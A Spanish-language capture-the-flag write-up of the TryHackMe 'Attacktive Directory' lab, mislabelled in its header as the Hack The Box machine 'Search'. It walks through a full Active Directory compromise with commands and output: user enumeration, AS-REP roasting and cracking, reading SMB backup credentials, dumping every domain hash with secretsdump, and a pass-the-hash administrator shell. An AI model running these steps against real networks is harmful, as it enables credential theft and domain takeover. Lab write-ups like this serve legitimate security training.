---
layout: post
title:  "Maquina Retirada Search de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search
tags: THM, Enumeration, SMB, Kerbrute Userenum, ASPREPRoast Attack, Kerberoasting Attack, Secretsdumps.py, Maquina Gratuitas.
---

# Attacktive ~ Try Hack Me

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.165.157       "
``` 

Segundo escaneo para ver los Servicios
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 11:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-14T11:40:15+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-13T11:34:00
|_Not valid after:  2022-12-13T11:34:00
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-14T11:40:05+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2022-06-14T11:40:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Procedemos a identificar el nombre de Dominio `spookysec.local` e introducirlo en nuestro `/etc/hosts` 
```
# ping -c 1 spookysec.local
PING spookysec.local (10.10.165.157) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.165.157): icmp_seq=1 ttl=127 time=54.1 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
```

Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios
```
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/15/22 - Ronnie Flathers @ropnop

2022/06/15 13:01:07 >  Using KDC(s):
2022/06/15 13:01:07 >   spookysec.local:88

2022/06/15 13:01:07 >  [+] svc-admin has no pre auth required.
2022/06/15 13:01:07 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/15 13:01:08 >  [+] VALID USERNAME:       james@spookysec.local
2022/06/15 13:01:24 >  [+] VALID USERNAME:       robin@spookysec.local
2022/06/15 13:01:39 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/15 13:02:07 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/15 13:02:30 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/15 13:02:31 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/15 13:03:06 >  [+] VALID USERNAME:       James@spookysec.local
2022/06/15 13:04:51 >  [+] VALID USERNAME:       backup@spookysec.local
```

Como vemos el usuario `svc-admin` seria vulnerable a un ataque de ASPREPRoast
```
# GetNPUsers.py spookysec.local/ -no-pass -usersfile content/users                                                                                                                                         130 ⨯
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:914d34c23212fbf3ad067101c8f05650$4c8a067f62ae3508879bef3fc92eb8e6b31aa9f616071d47aad50e5ebeab47d5e2bfebdd5aed73a9a79f7eed5ae9a4818ff0c75ac203f1f62ae82053acc1cdde98f24b28afef9eaa67b417e89743b3bc2de9873661a68a95507bf9b27d4d8306b1564b4833c5bcc95eb44e0eb5b49c71c4485e2e616245cae67d8921dc260f61206104cecfd48b30a3033af36836cbded82913910b3ee32623bc10fa12681df67c90f0de13a31b7d18cd5e9900be859894d9725d1044a652c78495f891c8c734762a6284a0f4b05c9460baf31cc56e6aff1911eda33959732d5a8cbb8031ea5649137a63f3d68c9b859f1835652e6e0d6e51
```

Nos Copiamos el Hash y procedemos a crackearlo con la herramienta John
```
# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
"management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)"     
1g 0:00:00:02 DONE (2022-06-15 13:09) 0.3367g/s 1965Kp/s 1965Kc/s 1965KC/s manaia010..mamuchopia9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Nos creamos un archivo de credenciales, con las credenciales obtenidas
```
svc-admin: management2005
```

Procedemos a intentar conectarnos por SMB al recurso Backup con las credenciales Optenidas
```
# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local -r backup
[+] IP: 10.10.165.157:445       Name: spookysec.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        backup                                                  READ ONLY
        .\backup\*
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 21:08:53 2020    backup_credentials.txt
```

Cuando Procedemos a descargar el archivo obtenemos un problema.
```
# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local --download backup/backup_credentials.txt
# du -h 10.10.165.157-backup__credentials.txt                                                                                                                         
0       10.10.165.157-backup__credentials.txt
```
Como vemos que no funciona correctamente procedo a montarme el recurso compartido con una montura a mi directorio /mnt
```
# mount -t cifs //10.10.165.157/backup /mnt/ -o username="svc-admin",password="management2005",domain=spookysec.local,rw
# ls -la /mnt                     
total 5
drwxr-xr-x  2 root root    0 abr  4  2020 .
drwxr-xr-x 20 root root 4096 may 31 21:36 ..
-rwxr-xr-x  1 root root   48 abr  4  2020 backup_credentials.txt
```
Procedemos a leer el Archivo
```
# cat /mnt/backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

# cat /mnt/backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```
Nos guardamos las credenciales en el archivo Creds
Procedemos a enumerar con bloodhound.py el directorio activo
```
# python3 bloodhound.py -u svc-admin -p "management2005" -d spookysec.local -ns 10.10.165.157 --zip
INFO: Found AD domain: spookysec.local
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
INFO: Done in 00M 05S
INFO: Compressing output into 20220615135241_bloodhound.zip
```
Una vez obtendio el .zip procedemos a iniciar Neo4J y bloodhound
```


Introducimos nuestras credenciales en Neo4J 
Iniciamos el BloodHound desde nuestro directorio /opt/BloodHound he introducimos nuestras credenciales
./BloodHound --no-sandbox 2>/dev/null &                                                                                                                                
[2] 3424

Cargamos nuestro .zip
Marcamos los usuarios que tenemos comprometidos e enumeramos informacion de estos mismos
Vemos que para el Usuario Backup pertenece al grupo de Domain Users.
```

Procedemos a intentar ejecutar la herramienta `Secretsdumps.py`
```
# secretsdump.py -just-dc backup:backup2517860@spookysec.local                                                                                                         
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation                                                                                                                                                   
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                         
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                         
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                               
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                         
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                     
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                   
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                     
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                           
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                         
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                       
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                     
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                     
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                     
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                       
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                     
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:c1cc5e04834fdec25529f43ff910f00c:::
```

Procedemos a hacer uso de evil-winrm proporcionando el hash del usuario administrator
```
# evil-winrm -i 10.10.165.157 -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc'
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

Maquina Comprometida AD ~ K0H4ck
